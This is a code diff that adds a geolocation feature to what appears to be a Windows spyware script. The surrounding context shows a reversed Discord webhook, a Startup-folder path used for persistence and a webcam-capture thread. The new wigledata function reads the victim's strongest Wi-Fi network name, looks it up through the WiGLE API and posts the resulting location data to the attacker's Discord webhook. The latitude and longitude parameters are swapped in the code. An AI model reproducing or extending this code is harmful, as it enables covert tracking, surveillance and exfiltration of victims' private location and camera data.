@@ -35,6 +35,7 @@ import urllib
 webhookurl=""
 wifiencoding=""
 webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
+api_key = 'WigleAPIheader'
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -816,7 +817,48 @@ def get_strongest_wifi_info():
 
     return strongest_signal_network
 
+def wigledata():
+    ssid=''
+    api_url = 'https://api.wigle.net/api/v2/network/search'
+    if get_strongest_wifi_info()[1] is None:
+        return None
+    else:
+        ssid=get_strongest_wifi_info()[1] 
+        
+    params = {
+        'first': '0',
+        'freenet': 'false',
+        'paynet': 'false',
+        'closestLong': lat,
+        'closestLat': long,
+        'ssid': str(ssid),
+    }
+    headers = {
+        'Authorization': f'Basic {api_key}',
+    }
+
+    response = requests.get(api_url, headers=headers, params=params)
     
+    if response.status_code == 200:
+        try:
+            wigle_data = response.json()
+            print(wigle_data)
+            # Process the response data as needed
+            if 'results' in wigle_data and wigle_data['results']:
+                first_result = wigle_data['results'][0]  # Access the first result
+                wigleembed = DiscordEmbed(title='WiGLE wifi data', description='', color='4DBDD0')
+                for item, key in first_result.items():
+                    key = f'```{key}```'
+                    wigleembed.add_embed_field(name=item, value=str(key))
+                webhook.add_embed(wigleembed)
+            else:
+                print("No results in the response.")
+        except ValueError as e:
+            print("Error parsing JSON response:", e)
+    else:
+        print("API request failed with status code:", response.status_code)
+        print("Response content:", response.text)
+wigledata()    
     
    
 webcamthread=threading.Thread(target=webcam)
